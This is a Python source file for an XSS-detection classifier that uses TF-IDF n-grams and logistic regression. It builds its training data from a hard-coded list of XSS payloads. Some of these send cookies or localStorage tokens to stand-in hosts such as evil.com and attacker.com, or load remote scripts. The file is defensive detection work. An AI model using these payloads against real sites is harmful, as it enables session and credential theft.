"""
SecureScript Baseline Machine Learning Model.

Uses character-level TF-IDF n-gram vectorization and Logistic Regression
to establish the baseline classification benchmark for Phase 1 prior to
PyTorch Bi-LSTM deep learning implementation in Phase 2.
"""

from __future__ import annotations

import os
from dataclasses import dataclass
from typing import List, Optional, Tuple

import joblib
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.linear_model import LogisticRegression
from sklearn.metrics import accuracy_score, classification_report, confusion_matrix
from sklearn.model_selection import train_test_split
from sklearn.pipeline import Pipeline

from securescript.core.normalizer import normalize


@dataclass
class BaselineEvaluationMetrics:
    """Evaluation metrics for the baseline model."""
    accuracy: float
    false_positive_rate: float
    precision: float
    recall: float
    f1_score: float
    total_samples: int


class BaselineXSSClassifier:
    """
    TF-IDF + Logistic Regression benchmark classifier.
    """

    def __init__(self):
        self.pipeline = Pipeline([
            ("tfidf", TfidfVectorizer(
                analyzer="char_wb",
                ngram_range=(2, 5),
                max_features=5000,
                lowercase=True
            )),
            ("clf", LogisticRegression(C=1.0, max_iter=500, random_state=42))
        ])
        self.is_trained = False

    def train(self, texts: List[str], labels: List[int]) -> BaselineEvaluationMetrics:
        """
        Trains the classifier on labeled texts (0 = Benign, 1 = Malicious).
        """
        # Pre-normalize texts using SecureScript normalizer
        normalized_texts = [normalize(t).normalized for t in texts]

        x_train, x_test, y_train, y_test = train_test_split(
            normalized_texts, labels, test_size=0.2, random_state=42, stratify=labels
        )

        self.pipeline.fit(x_train, y_train)
        self.is_trained = True

        y_pred = self.pipeline.predict(x_test)
        acc = float(accuracy_score(y_test, y_pred))

        # Calculate False Positive Rate: FP / (FP + TN)
        tn, fp, fn, tp = confusion_matrix(y_test, y_pred).ravel()
        fpr = float(fp / (fp + tn)) if (fp + tn) > 0 else 0.0
        precision = float(tp / (tp + fp)) if (tp + fp) > 0 else 0.0
        recall = float(tp / (tp + fn)) if (tp + fn) > 0 else 0.0
        f1 = float(2 * (precision * recall) / (precision + recall)) if (precision + recall) > 0 else 0.0

        return BaselineEvaluationMetrics(
            accuracy=acc,
            false_positive_rate=fpr,
            precision=precision,
            recall=recall,
            f1_score=f1,
            total_samples=len(texts)
        )

    def predict(self, text: str) -> Tuple[int, float]:
        """
        Predicts label and probability for an input text.
        
        Returns:
            Tuple of (predicted_label [0 or 1], confidence_score [0.0 - 1.0])
        """
        if not self.is_trained:
            raise RuntimeError("Classifier has not been trained yet.")

        norm_text = normalize(text).normalized
        proba = self.pipeline.predict_proba([norm_text])[0]
        # proba[1] is malicious probability
        confidence = float(proba[1])
        label = 1 if confidence >= 0.5 else 0
        return label, confidence

    def save(self, model_path: str) -> None:
        """Serializes trained pipeline to disk."""
        os.makedirs(os.path.dirname(os.path.abspath(model_path)), exist_ok=True)
        joblib.dump(self.pipeline, model_path)

    def load(self, model_path: str) -> None:
        """Loads serialized pipeline from disk."""
        self.pipeline = joblib.load(model_path)
        self.is_trained = True


def generate_benchmark_dataset() -> Tuple[List[str], List[int]]:
    """
    Generates a curated baseline dataset of standard XSS vectors and benign enterprise text.
    """
    malicious = [
        "<script>alert(1)</script>",
        "<script src='http://evil.com/xss.js'></script>",
        "<img src=x onerror=alert(1)>",
        "<img src=1 onerror=alert(document.cookie)>",
        "<svg onload=alert(1)>",
        "<body onload=alert('xss')>",
        "<iframe src='javascript:alert(1)'>",
        "javascript:alert(1)",
        "javascript:void(0)",
        "<input type=text value=\"\" onfocus=alert(1) autofocus>",
        "<details open ontoggle=alert(1)>",
        "<video><source onerror=alert(1)></video>",
        "<audio src=x onerror=alert(1)>",
        "<a href='javascript:alert(1)'>Click me</a>",
        "<object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='>",
        "%3Cscript%3Ealert(1)%3C/script%3E",
        "%253Cscript%253Ealert(1)%253C/script%253E",
        "&lt;script&gt;alert(1)&lt;/script&gt;",
        "&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;",
        "<img src=x onerror=\"javascript:document.location='http://attacker.com/?c='+document.cookie\">",
        "<script>eval(atob('YWxlcnQoMSk='))</script>",
        "<svg/onload=alert(1)>",
        "';alert(1);//",
        "\";alert(1);//",
        "<script>fetch('http://evil.com/steal?token='+localStorage.getItem('token'))</script>"
    ] * 20  # Scale count

    benign = [
        "John Doe",
        "search query for laptops and monitors",
        "5 < 10 and 10 > 2",
        "for i in range(10): print(i)",
        "def calculate_total(a, b): return a + b",
        "SELECT id, name FROM users WHERE age > 18",
        "This is a standard blog post comment discussing modern cybersecurity trends.",
        "Check out our new release notes at https://example.com/release-v2.1",
        "math formulas like a < b or c > d are common in algebra.",
        "user_email=alice@company.org&sort=asc&limit=25",
        "Please review the attached invoice PDF and confirm payment.",
        "Error 404: The requested resource was not found on this server.",
        "The quick brown fox jumps over the lazy dog.",
        "Welcome to SecureScript! Fast and intelligent application defense.",
        "git commit -m 'Fixed bug in authentication middleware'"
    ] * 35  # Scale count

    texts = malicious + benign
    labels = [1] * len(malicious) + [0] * len(benign)

    return texts, labels


if __name__ == "__main__":
    texts, labels = generate_benchmark_dataset()
    classifier = BaselineXSSClassifier()
    metrics = classifier.train(texts, labels)
    print("=== Phase 1 Baseline Benchmark Results ===")
    print(f"Total Samples Evaluated: {metrics.total_samples}")
    print(f"Accuracy:                {metrics.accuracy * 100:.2f}%")
    print(f"False Positive Rate:     {metrics.false_positive_rate * 100:.2f}%")
    print(f"Precision:               {metrics.precision * 100:.2f}%")
    print(f"Recall:                  {metrics.recall * 100:.2f}%")
    print(f"F1 Score:                {metrics.f1_score * 100:.2f}%")

    model_output_path = os.path.join(os.path.dirname(__file__), "..", "..", "data", "baseline_model.joblib")
    classifier.save(model_output_path)
    print(f"Baseline model saved to: {model_output_path}")
